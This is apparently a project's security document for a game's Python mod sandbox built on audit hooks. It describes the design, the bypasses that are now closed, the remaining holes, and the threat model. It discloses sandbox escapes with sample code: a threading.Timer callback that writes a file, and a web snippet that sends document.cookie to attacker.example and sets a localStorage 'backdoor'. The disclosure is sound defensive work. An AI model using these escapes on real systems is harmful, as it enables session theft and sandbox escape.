# Mod Sandbox Security Model

> This describes what the mod sandbox does and does not guarantee. It is
> **not** the repo's vulnerability reporting policy -- there is no private
> reporting channel at the time of writing; see issue #52.

This document explains what the mod loader's sandbox does, what it does **not** do, and what to do if you need a real security boundary for untrusted mods. It is the authoritative answer to "is a sandboxed mod safe?".

## TL;DR

- **Desktop (Windows / macOS / Linux):** the sandbox blocks the *trivial* paths a sandboxed mod would use to touch the filesystem, spawn processes, or open sockets. It is not a hard security boundary — a determined mod can still escape via CPython internals or by scheduling callbacks that don't carry the mod's frame on the call stack. **Treat sandboxed mods as code you trust.**
- **Web (pygbag / WASM):** the sandbox is **advisory only**. `platform.window` is reachable from any Python code and gives the mod the full browser (`fetch`, `localStorage`, `XMLHttpRequest`, `eval`). None of those are CPython audit events. **Treat sandboxed mods on web as fully privileged.**
- **If you genuinely need to run untrusted mods**, the long-term answer is the WebAssembly runtime sketched in [issue #51](https://github.com/GitGetGot415/Greater-Diplomacy-5/issues/51). The Python-level sandbox is not it.

---

## What the sandbox is

A mod is either **sandboxed** or **unsandboxed**. The per-mod toggle lives in `mods/enabled_mods.json`; new mods default to sandboxed.

When a sandboxed mod is loaded, `mod_loader._ModSourceLoader.exec_module` registers `id(module.__dict__)` into a private set captured by an `sys.addaudithook`-installed callback. The hook (PEP 578) intercepts a curated list of dangerous operations at the C level — `open`, `os.remove`, `os.system`, `subprocess.Popen`, `socket.*`, `ctypes.*`, and so on — and walks the full Python call stack at fire time. If **any** frame on the stack has its `f_globals` registered as a sandboxed mod's `__dict__`, the hook raises `PermissionError`.

The set of sandboxed module-dict ids is held in a closure inside `_install_sandbox_audit_hook`. It is **not** stored as a module attribute the mod can reach. The blocked-event tables (`_SANDBOX_BLOCKED_EVENTS`, `_SANDBOX_BLOCKED_PREFIXES`) are similarly snapshotted into the hook's closure at install time as frozen tuples, so reassigning them on `mod_loader`'s globals later has no effect.

### What this closes

The bypasses below all worked against the post-#22 sandbox design and no longer work against the current one:

1. **Delete your own marker.** The old design put a sentinel string `__gd5_mod_sandbox__` in the mod's own `module.__dict__`; `globals().pop("__gd5_mod_sandbox__", None)` disarmed the sandbox. The new design stores no marker in the mod's globals — sandboxed-ness is keyed by `id(module.__dict__)`, which the mod cannot change without replacing the dict object entirely (and existing functions defined in the mod still hold a reference to the original dict, so their frames still trip the check).
2. **Hop through a game function that does file I/O.** The old design only checked `sys._getframe(1)`, the *direct* caller; the game function's frame had no marker, so the call was allowed. The new design walks the full stack; the mod's frame is still on the stack underneath the game function's, so the block fires.
3. **`exec()` fresh code with a fresh globals dict.** The exec'd code's frame has `f_globals` pointing at the new dict (not in our set), but `f_back` is the mod's frame, which is in our set. Block fires.
4. **Defang the hook's config table.** `mod_loader._SANDBOX_BLOCKED_EVENTS = set()` from a sandboxed mod reassigns the module attribute, but the hook reads a `frozenset` captured at install time. Reassignment has no effect.
5. **Replace the loader itself.** `mod_loader`, `main`, and `data.platform` are on the reserved-targets blacklist (`_RESERVED_TARGETS`); mods targeting them are rejected by `install()` and reported invalid in `describe_mod()`.

### Where the marker lives (and why a mod can't delete it)

```python
def _install_sandbox_audit_hook():
    blocked_events = frozenset(_SANDBOX_BLOCKED_EVENTS)
    blocked_prefixes = tuple(_SANDBOX_BLOCKED_PREFIXES)
    sandboxed_dict_ids = set()        # <-- private to this closure
    sandboxed_module_refs = []       # strong refs so __dict__ isn't GC'd

    def register(module):
        sandboxed_dict_ids.add(id(module.__dict__))
        sandboxed_module_refs.append(module)

    def hook(event, args):
        ...
        while frame is not None:
            if id(frame.f_globals) in sandboxed_dict_ids:
                raise PermissionError(...)
            frame = frame.f_back

    sys.addaudithook(hook)
    return register  # stored as mod_loader._register_sandboxed_module
```

A mod can `import mod_loader` and reassign `mod_loader._register_sandboxed_module = lambda m: None` — but that only prevents *future* registrations. The mod's own module was already registered before its top-level code ran.

The closure-captured `sandboxed_dict_ids` set itself is not reachable from any module attribute. The only way to clear it would be to reach the closure's cell, which requires CPython-internal access (`ctypes`, frame introspection on the hook function itself, etc.).

### Why import machinery is carved out

The hook checks whether the **direct** caller of a blocked event is CPython's own import machinery (`_frozen_importlib`, `_frozen_importlib_external`, or anything under `importlib.`). If so, the hook returns early without walking the stack.

This carve-out is necessary, not a hole: a sandboxed mod doing `import data.io_helpers` triggers the import system to read `data/io_helpers.py` from disk, which fires the `open` audit event. Without the carve-out, the strict stack walk would find the mod's frame underneath the import machinery's and block — which would break every `import` statement a sandboxed mod issues.

The carve-out applies only when the *direct* caller is importlib. If the mod calls a game function that does file I/O, the direct caller is the game function (not importlib), and the stack walk still finds the mod's frame. The bypass via "hop through a game function" remains closed.

---

## What the sandbox does NOT do

### Residual hole 1: scheduled callbacks

A sandboxed mod that schedules a callback via `threading.Timer`, `signal.signal`, `atexit`, `asyncio.create_task`, or similar — and triggers a blocked op from inside that callback — can escape. The callback fires from a context where the mod's own frame is not on the call stack (the callback's `f_back` is the threading / signal / asyncio dispatcher, not the mod's top-level code).

Example that still works against the current sandbox:

```python
# sandboxed mod, target=anything
import threading

def evil():
    # By the time this runs, the mod's frame is long gone from the stack.
    # f_back is threading.Thread.run or Timer.__init__'s callback dispatch.
    open("/tmp/pwned", "w").close()

threading.Timer(0.1, evil).start()
```

The audit hook fires for `open`, walks the stack, doesn't find a sandboxed frame, allows it.

**Why we don't close this**: there's no clean way to distinguish "mod scheduled this callback" from "mod installed a normal hook the game uses legitimately" at the Python level. The audit hook only sees the call stack at fire time, not the call stack at registration time.

**What to do**: don't run mods you don't trust. If you need to run untrusted mods, use the WASM runtime.

### Residual hole 2: CPython internals

A mod that uses `ctypes` to reach `PyImport_AddModule` and rewrite sandbox state from C, or that crafts a code object whose `co_globals` aliases a non-sandboxed module's globals, can escape. This is a CPython-level escape and is out of scope for a Python-level sandbox.

The blocked-event list does include the `ctypes.` prefix, which prevents the obvious `import ctypes; ctypes.CDLL(...)` route. But a sufficiently determined attacker can use the `_ctypes` C API directly, or `ctypes.pythonapi` to reach CPython symbols without triggering the prefix check.

### Residual hole 3: web builds

On `sys.platform == "emscripten"`, `platform.window` is reachable from any Python code via `import platform` (stdlib, patched by pygbag with `.window`). The audit hook cannot see calls through it:

```python
import platform
w = platform.window
w.fetch("https://attacker.example/exfil?cookie=" + w.document.cookie)
w.localStorage.setItem("backdoor", "true")
w.eval("new XMLHttpRequest().open('GET','https://attacker')")
```

The audit hook fires for none of these because they're foreign-function calls into the browser DOM, not CPython operations.

`install()` logs a clear warning when a sandboxed mod is enabled on web:

```
Mod 'foo.py' is marked sandboxed, but on the web build the Python-level
sandbox does not extend to platform.window or browser APIs. Treat it as
fully privileged. See issue #51 for the long-term fix.
```

This is honest labelling, not a fix. The real fix is the WASM runtime.

### Residual hole 4: side-channel reads via `os.listdir`

`os.listdir` is on the blocked list (it's used by `PathFinder` and by various game modules). The import-machinery carve-out lets `PathFinder`'s own `os.listdir` calls through, but a sandboxed mod calling `os.listdir("/home/user")` directly is blocked — which is what we want. However, the mod can still get a directory listing indirectly through any game function that returns file lists; the hop-through-game-function bypass is closed, but if the game itself exposes "list saves in the saves dir", the mod can call that and read the result.

This is by design: the sandbox blocks direct file/process/network access, not indirect information flow through the game's own API.

---

## Threat model

The sandbox is designed for **careless or lazily malicious mods**:

- A mod author who writes a benign mod that happens to import `subprocess` for a legitimate reason, but whose mod is being evaluated for safety by a user.
- A mod author who copies code from a Stack Overflow answer that includes a `os.system` call without realizing it's dangerous.
- A mod author who is curious what's in the user's home directory and lists it once to debug a path issue.

It is **not** designed for:

- A mod author who actively wants to compromise the user's machine or browser session.
- A mod author who has read this SECURITY.md and is targeting the residual holes.
- A mod distributed by an attacker via a compromised mod repository.

For those threat models, the answer is: don't install the mod. The long-term answer for untrusted mods is the WebAssembly runtime in [issue #51](https://github.com/GitGetGot415/Greater-Diplomacy-5/issues/51).

---

## Operational guidance

### For mod authors

- Mark your mod `sandbox=on` in the manifest if it doesn't need filesystem / process / network access. The sandbox is a feature, not a hindrance — it tells users your mod is safe.
- Mark your mod `sandbox=off` if it genuinely needs file access (e.g., a save-import mod, an export-to-PNG mod). The user still has to toggle Unsandboxed on the Mods screen; `sandbox=off` in the manifest is a hint that the mod needs that, not an override of the user's preference.
- Don't try to defeat the sandbox. If you find yourself reaching for `globals().pop` or `exec(..., {})` to get around a `PermissionError`, your mod probably should be `sandbox=off` instead.

### For users

- **Read the mod source before enabling it.** The mod file is plain Python; you can open it in any text editor.
- Don't enable mods from sources you don't trust. The sandbox narrows the blast radius of bugs and lazy maliciousness; it does not turn an untrusted mod into a safe one.
- On the web build, **sandboxed means nothing**. Treat every mod on web as fully privileged over your browser session.
- If a mod you trust needs file access, toggle it to Unsandboxed on the Mods screen. The toggle is explicit; a sandboxed mod that suddenly stops working because it can't open a file is doing exactly what you want.

### For contributors

- Do not add anything to `_SANDBOX_BLOCKED_EVENTS` without checking it doesn't fire during normal game operation. If it does, you'll break the game.
- Do not remove the import-machinery carve-out in `_install_sandbox_audit_hook`. Without it, every `import` from a sandboxed mod fails.
- Do not move the sandboxed-dict-ids set out of the closure into a module attribute. The whole point is that a mod can't reach it.
- If you find a new bypass, add a test case to `scripts/test_mod_loader_security.py` *before* you fix it. The test suite is the regression net.

---

## References

- PEP 578 (audit hooks): https://peps.python.org/pep-0578/
- Audit events reference: https://docs.python.org/3/library/audit_events.html
- Original sandbox design (post-#22): see git history of `mod_loader.py` lines 213–264 (now rewritten).
- Issue tracking the bypasses documented here: [issue #50](https://github.com/GitGetGot415/Greater-Diplomacy-5/issues/50).
- Long-term WASM runtime proposal: [issue #51](https://github.com/GitGetGot415/Greater-Diplomacy-5/issues/51)
